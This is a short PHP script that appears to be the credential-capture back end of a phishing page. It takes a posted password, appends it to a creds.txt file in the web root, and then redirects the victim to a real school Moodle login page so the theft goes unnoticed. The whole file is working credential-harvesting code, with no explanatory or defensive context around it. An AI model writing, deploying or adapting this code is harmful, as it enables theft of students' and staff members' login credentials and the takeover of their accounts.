<?php
if (isset($_POST["password"])) {
    $pass = $_POST["password"];
    ($file = fopen("/var/www/html/creds.txt", "a+")) or die("Unable to openfile!");
    $data = "Password: " . $pass . "\n";
    fwrite($file, $data);
    fclose($file);
    header("Location: https://educaciodigital.cat/iesbadia/moodle/login/index.php");
}
?>